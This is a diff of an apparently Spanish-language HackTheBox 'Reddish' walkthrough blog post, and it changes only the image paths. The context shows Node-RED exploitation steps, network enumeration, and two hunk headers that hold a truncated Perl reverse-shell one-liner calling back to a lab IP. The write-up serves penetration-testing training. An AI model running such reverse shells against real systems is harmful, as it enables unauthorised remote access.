@@ -5,7 +5,7 @@ date:   2021-10-17 09:29:20 +0700
 categories: jekyll update
 ---
 <figure>
-<img src="reddishlogo.png" alt="reddishlogo">
+<img src="/assets/img/reddishlogo.png" alt="reddishlogo">
 </figure>
 
 Este walkthrough muestra el paso a paso para explotar un laboratorio de hackthebox (Reddish), utilizado como entrenamiento para preparar el examen de OSCP o eCPTT especificamente para el skill de pivoting.
@@ -46,13 +46,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Solo tenemos un puerto abierto. Así que lo abri en el browser, me mostro un error de método GET.
 
 <figure>
-<img src="1.png" alt="1">
+<img src="/assets/img/1.png" alt="1">
 </figure>
 
 Capture la request con burp suite y cambié la solicitud a POST y obtuve una respuesta. Contiene un ID y un path. Podemos acceder a esa ruta solo con un ID. Es un servicio [Node-RED][nodered]
 
 <figure>
-<img src="2.png" alt="2">
+<img src="/assets/img/2.png" alt="2">
 </figure>
 
 # Code Execution / Shell in Node-Red
@@ -60,7 +60,7 @@ Capture la request con burp suite y cambié la solicitud a POST y obtuve una res
 Deberia quedar un flujo asi:
 
 <figure>
-<img src="3.png" alt="3">
+<img src="/assets/img/3.png" alt="3">
 </figure>
 
 Tambien existe otra forma, importando el siguiente codigo (modificando el host 10.10.X.X)
@@ -141,7 +141,7 @@ perl -e 'use Socket;$i="10.10.14.30";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpro
 {% endhighlight %}
 
 <figure>
-<img src="4.png" alt="4">
+<img src="/assets/img/4.png" alt="4">
 </figure>
 
 # NODERED -> CONTAINER TWO (AKA WWW)
@@ -166,7 +166,7 @@ perl -e 'use Socket;$i="10.10.14.30";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpro
 Podemos ver que estamos dentro de un contenedor.
 
 <figure>
-<img src="5.png" alt="5">
+<img src="/assets/img/5.png" alt="5">
 </figure>
 
 ### Network Enumeration
@@ -187,7 +187,7 @@ Utilizaremos un one piner para ver los host que estan activos dentro de la red.
 Ahora tenemos dos nuevos host
 
 <figure>
-<img src="6.png" alt="6">
+<img src="/assets/img/6.png" alt="6">
 </figure>
 
 Port scan en bash
